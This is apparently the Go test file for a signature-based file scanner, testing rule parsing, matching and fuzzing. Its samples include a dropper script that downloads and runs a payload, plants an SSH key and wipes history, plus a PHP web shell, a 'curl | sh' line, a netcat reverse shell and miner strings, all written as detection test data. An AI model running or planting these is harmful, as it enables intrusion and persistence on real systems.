package filerules

import (
	"errors"
	"strings"
	"testing"
	"testing/fstest"
)

func TestBuiltinRulesLoadAndPassTheirTests(t *testing.T) {
	set, err := Builtin()
	if err != nil {
		t.Fatalf("Builtin: %v", err)
	}
	if got := len(set.Rules()); got != 7 {
		t.Fatalf("got %d built-in file rules, want 7", got)
	}
	for _, rule := range set.Rules() {
		if rule.ID == "" || rule.Description == "" || len(rule.Tags) == 0 {
			t.Errorf("rule %s needs an id, a description and tags", rule.Name)
		}
	}
}

func one(t *testing.T, text string) *Rule {
	t.Helper()
	parsed, err := Parse([]byte(text), "test.yml")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(parsed) != 1 {
		t.Fatalf("got %d rules", len(parsed))
	}

	return parsed[0]
}

const head = "name: sample\ntitle: Sample\ntests: [{text: x, match: false}]\n"

func TestConditions(t *testing.T) {
	strs := "strings:\n  alpha: {text: alpha}\n  beta: {text: beta}\n  gamma: {text: gamma}\n"
	cases := []struct {
		condition string
		data      string
		want      bool
	}{
		{"alpha", "xx alpha", true},
		{"alpha and beta", "alpha", false},
		{"alpha and beta", "beta alpha", true},
		{"alpha or beta", "beta", true},
		{"not alpha", "beta", true},
		{"not alpha", "alpha", false},
		{"alpha and (beta or gamma)", "alpha gamma", true},
		{"alpha and not (beta or gamma)", "alpha gamma", false},
		{"any of them", "gamma", true},
		{"any of them", "none", false},
		{"all of them", "alpha beta", false},
		{"all of them", "alpha beta gamma", true},
		{"2 of them", "alpha gamma", true},
		{"2 of them", "gamma", false},
		{"3 of them", "alpha beta gamma", true},
		{"any of (alpha, beta)", "gamma", false},
		{"any of (alpha, beta)", "beta", true},
		{"all of (alpha,beta)", "alpha beta", true},
		{"2 of (alpha, beta, gamma)", "beta gamma", true},
		{"any of al*", "alpha", true},
		{"any of al*", "beta", false},
		{"ALPHA AND Beta", "alpha beta", true},
		{"not not alpha", "alpha", true},
	}
	for _, current := range cases {
		rule := one(t, head+strs+"condition: "+current.condition+"\n")
		if got := rule.Match("tmp/x", []byte(current.data)) != nil; got != current.want {
			t.Errorf("%q on %q: got %v, want %v", current.condition, current.data, got, current.want)
		}
	}
}

func TestBadRulesAreRefused(t *testing.T) {
	strs := "strings:\n  alpha: {text: alpha}\n  beta: {text: beta}\n"
	cases := map[string]string{
		"unknown string":         head + strs + "condition: alpha and delta\n",
		"unclosed":               head + strs + "condition: (alpha or beta\n",
		"extra":                  head + strs + "condition: alpha beta\n",
		"empty":                  head + strs + "condition: ''\n",
		"too many of":            head + strs + "condition: 3 of them\n",
		"zero of":                head + strs + "condition: 0 of them\n",
		"of without target":      head + strs + "condition: any of\n",
		"bad list":               head + strs + "condition: any of (alpha beta)\n",
		"prefix fits nothing":    head + strs + "condition: any of z*\n",
		"dangling and":           head + strs + "condition: alpha and\n",
		"no strings":             head + "condition: alpha\n",
		"string with two kinds":  head + "strings:\n  alpha: {text: a, regex: b}\ncondition: alpha\n",
		"string with no kind":    head + "strings:\n  alpha: {nocase: true}\ncondition: alpha\n",
		"bad regex":              head + "strings:\n  alpha: {regex: '('}\ncondition: alpha\n",
		"empty regex":            head + "strings:\n  alpha: {regex: 'a*'}\ncondition: alpha\n",
		"regex with at":          head + "strings:\n  alpha: {regex: 'a', at: 0}\ncondition: alpha\n",
		"odd hex":                head + "strings:\n  alpha: {hex: '7f4'}\ncondition: alpha\n",
		"hex with no fixed pair": head + "strings:\n  alpha: {hex: '7f ?? 45'}\ncondition: alpha\n",
		"hex not hex":            head + "strings:\n  alpha: {hex: 'zz zz'}\ncondition: alpha\n",
		"nocase hex":             head + "strings:\n  alpha: {hex: '7f45', nocase: true}\ncondition: alpha\n",
		"reserved name":          head + "strings:\n  them: {text: a}\ncondition: any of them\n",
		"upper name":             head + "strings:\n  Alpha: {text: a}\ncondition: Alpha\n",
		"unknown key":            head + strs + "condition: alpha\nseverity: high\n",
		"bad level":              head + strs + "condition: alpha\nlevel: urgent\n",
		"glob path":              head + strs + "condition: alpha\npaths: ['tmp/*']\n",
		"escaping path":          head + strs + "condition: alpha\npaths: ['../etc']\n",
		"too big max":            head + strs + "condition: alpha\nmax_size: 999999999\n",
		"bad name":               "name: Bad-Name\ntitle: x\ntests: [{text: x, match: false}]\n" + strs + "condition: alpha\n",
		"no title":               "name: sample\ntests: [{text: x, match: false}]\n" + strs + "condition: alpha\n",
		"no tests":               "name: sample\ntitle: x\n" + strs + "condition: alpha\n",
		"test without match":     "name: sample\ntitle: x\ntests: [{text: x}]\n" + strs + "condition: alpha\n",
		"test with text and hex": "name: sample\ntitle: x\ntests: [{text: x, hex: '00', match: false}]\n" + strs + "condition: alpha\n",
		"deep":                   head + strs + "condition: " + strings.Repeat("(", 40) + "alpha" + strings.Repeat(")", 40) + "\n",
	}
	for name, text := range cases {
		if _, err := Parse([]byte(text), "test.yml"); !errors.Is(err, ErrInvalid) {
			t.Errorf("%s: got %v, want ErrInvalid", name, err)
		}
	}
}

func TestFailedTestRefusesTheSet(t *testing.T) {
	parsed, err := Parse([]byte("name: sample\ntitle: x\nstrings: {alpha: {text: alpha}}\ncondition: alpha\ntests: [{name: must hit, text: beta, match: true}]\n"), "test.yml")
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if _, err := NewSet(parsed); !errors.Is(err, ErrInvalid) || !strings.Contains(err.Error(), "must hit") {
		t.Fatalf("got %v, want the failed test named", err)
	}
}

func TestTwoRulesWithOneNameAreRefused(t *testing.T) {
	rule := "name: sample\ntitle: x\nstrings: {alpha: {text: alpha}}\ncondition: alpha\ntests: [{text: b, match: false}]\n"
	_, err := LoadFS(fstest.MapFS{"a.yml": {Data: []byte(rule)}, "b.yaml": {Data: []byte(rule)}})
	if !errors.Is(err, ErrInvalid) {
		t.Fatalf("got %v", err)
	}
}

func TestTooBigFileIsRefused(t *testing.T) {
	if _, err := Parse(make([]byte, maxFileBytes+1), "big.yml"); !errors.Is(err, ErrTooBig) {
		t.Fatalf("got %v", err)
	}
}

func TestStringKinds(t *testing.T) {
	rule := one(t, head+`strings:
  word: {text: Secret, nocase: true}
  shebang: {text: '#!', at: 0}
  magic: {hex: '4d 5a ?? 00', at: 0}
  tail: {hex: 'de ad be ef'}
  pattern: {regex: 'id=[0-9]{3}\b'}
condition: any of them
`)
	cases := []struct {
		data string
		want []string
	}{
		{"a SECRET here", []string{"word"}},
		{"MZ\x90\x00rest", []string{"magic"}},
		{"xMZ\x90\x00", nil},
		{"\x00\xde\xad\xbe\xef", []string{"tail"}},
		{"\xde\xad\xbe", nil},
		{"id=123 and id=12", []string{"pattern"}},
		{"secret id=999", []string{"pattern", "word"}},
		{"#!/bin/sh", []string{"shebang"}},
		{"echo #!", nil},
	}
	for _, current := range cases {
		hit := rule.Match("tmp/x", []byte(current.data))
		var got []string
		if hit != nil {
			got = hit.Strings
		}
		if strings.Join(got, ",") != strings.Join(current.want, ",") {
			t.Errorf("%q: got %v, want %v", current.data, got, current.want)
		}
	}
}

func TestHexWithAWildcardBeforeTheAnchor(t *testing.T) {
	rule := one(t, head+"strings:\n  pair: {hex: '?? ?? 41 42 ?? 43'}\ncondition: pair\n")
	for data, want := range map[string]bool{"xyAB-C": true, "AB-C": false, "zzzzAB-D xyABzC": true, "xyAB": false} {
		if got := rule.Match("tmp/x", []byte(data)) != nil; got != want {
			t.Errorf("%q: got %v, want %v", data, got, want)
		}
	}
}

func TestPathsAndSize(t *testing.T) {
	rule := one(t, head+"paths: [/var/www, srv/]\nmax_size: 10\nstrings: {alpha: {text: alpha}}\ncondition: alpha\n")
	cases := []struct {
		name string
		data string
		want bool
	}{
		{"var/www/a.php", "alpha", true},
		{"srv/x", "alpha", true},
		{"var/wwwx/a.php", "alpha", false},
		{"tmp/var/www/a", "alpha", false},
		{"var/www/a.php", "alpha and more than ten", false},
	}
	for _, current := range cases {
		if got := rule.Match(current.name, []byte(current.data)) != nil; got != current.want {
			t.Errorf("%s %q: got %v", current.name, current.data, got)
		}
	}
	if rule.MatchSized("srv/x", 1<<20, []byte("alpha")) != nil {
		t.Error("a file over max_size matched because only a part of it was read")
	}
}

func TestExcerptIsTheFirstFindAndSafe(t *testing.T) {
	rule := one(t, head+"strings:\n  late: {text: zebra}\n  early: {regex: 'curl[^\\n]*'}\n  bytes: {hex: '00 01'}\ncondition: any of them\n")
	hit := rule.Match("tmp/x", []byte("start curl http://203.0.113.80/\x1b[31mx then zebra"))
	if hit == nil || hit.Offset != 6 || hit.Excerpt != "curl http://203.0.113.80/ [31mx then zebra" {
		t.Fatalf("got %+v", hit)
	}
	long := rule.Match("tmp/x", []byte("curl "+strings.Repeat("a", 500)))
	if len(long.Excerpt) > maxExcerptBytes {
		t.Fatalf("excerpt of %d bytes", len(long.Excerpt))
	}
	binary := rule.Match("tmp/x", []byte("\x00\x01 zebra"))
	if binary.Excerpt != "bytes at offset 0" {
		t.Fatalf("got %q", binary.Excerpt)
	}
}

func TestBuiltinRulesOnFiles(t *testing.T) {
	set, err := Builtin()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name string
		data string
		want []string
	}{
		{"tmp/.u.sh", "#!/bin/sh\ncurl -fsSL http://203.0.113.80/k -o /dev/shm/.x/kworker\nchmod 755 /dev/shm/.x/kworker\nnohup /dev/shm/.x/kworker -B >/dev/null 2>&1 &\necho 'ssh-ed25519 AAAA x' >> /root/.ssh/authorized_keys\nunset HISTFILE\n",
			[]string{"file_download_and_run", "file_ssh_key_planting", "file_log_wiping"}},
		{"dev/shm/.x/kworker", "\x7fELF\x02\x01\x01 xmrig --donate-level=1 stratum+tcp://pool.example.test:3333", []string{"file_coin_miner", "file_program_in_temp"}},
		{"opt/app/bin/server", "\x7fELF\x02\x01\x01 http server", nil},
		{"var/www/html/up/x.php", "<?php echo shell_exec($_REQUEST['c']); ?>", []string{"file_web_shell"}},
		{"usr/local/bin/backup.sh", "#!/bin/sh\ncurl -o /var/backups/list.txt https://example.test/list\nchmod 600 /var/backups/list.txt\n", nil},
		{"etc/profile.d/history.sh", "export HISTSIZE=10000\nexport HISTFILESIZE=20000\n", nil},
	}
	for _, current := range cases {
		var got []string
		for _, rule := range set.Rules() {
			if rule.Match(current.name, []byte(current.data)) != nil {
				got = append(got, rule.Name)
			}
		}
		if strings.Join(got, ",") != strings.Join(current.want, ",") {
			t.Errorf("%s: got %v, want %v", current.name, got, current.want)
		}
	}
}

func FuzzMatch(f *testing.F) {
	set, err := Builtin()
	if err != nil {
		f.Fatal(err)
	}
	f.Add("tmp/x", []byte("#!/bin/sh\ncurl http://203.0.113.80/a | sh\n"))
	f.Add("var/www/a.php", []byte("<?php system($_GET['c']);"))
	f.Add("dev/shm/k", []byte("\x7fELF\xff\xfe stratum+tcp://"))
	f.Fuzz(func(t *testing.T, name string, data []byte) {
		for _, rule := range set.Rules() {
			hit := rule.Match(name, data)
			if hit == nil {
				continue
			}
			if len(hit.Strings) == 0 && hit.Offset >= 0 || hit.Offset > len(data) || len(hit.Excerpt) > maxExcerptBytes {
				t.Fatalf("bad hit %+v", hit)
			}
			if strings.ContainsFunc(hit.Excerpt, func(character rune) bool { return character < 0x20 }) {
				t.Fatalf("control character in %q", hit.Excerpt)
			}
		}
	})
}

func FuzzParse(f *testing.F) {
	f.Add("name: a\ntitle: b\nstrings: {x: {text: y}}\ncondition: x\ntests: [{text: y, match: true}]\n")
	f.Add("name: a\ntitle: b\nstrings: {x: {hex: '7f ?? 45 4c'}}\ncondition: any of them\ntests: [{hex: '7f0045 4c', match: true}]\n")
	f.Add("condition: 2 of (a, b")
	f.Fuzz(func(t *testing.T, text string) {
		parsed, err := Parse([]byte(text), "fuzz.yml")
		if err != nil {
			return
		}
		set, err := NewSet(parsed)
		if err != nil {
			return
		}
		for _, rule := range set.Rules() {
			rule.Match("tmp/x", []byte(text))
		}
	})
}

// Found in the live test: a list of CVEs of 60 MB quotes an injection with "nc ... -e /bin/bash". A backdoor
// script is small, so the rules for scripts do not match a file over 1 MB. The rules for programs still do.
func TestScriptRulesPassOverLargeData(t *testing.T) {
	set, err := Builtin()
	if err != nil {
		t.Fatal(err)
	}
	data := []byte(strings.Repeat("CVE record text. ", 70_000) + "input ;nc 203.0.113.80 4444 -e /bin/bash; leads to injection\n")
	for _, rule := range set.Rules() {
		if hit := rule.Match("home/aiko/data/cve.txt", data); hit != nil {
			t.Errorf("%s matched a large data file", rule.Name)
		}
	}
	program := append([]byte("\x7fELF\x02\x01\x01"), make([]byte, 2<<20)...)
	program = append(program, "xmrig --donate-level stratum+tcp://pool.example.test"...)
	got := []string{}
	for _, rule := range set.Rules() {
		if rule.Match("tmp/k", program) != nil {
			got = append(got, rule.Name)
		}
	}
	if strings.Join(got, ",") != "file_coin_miner,file_program_in_temp" {
		t.Errorf("a large program: %v", got)
	}
}
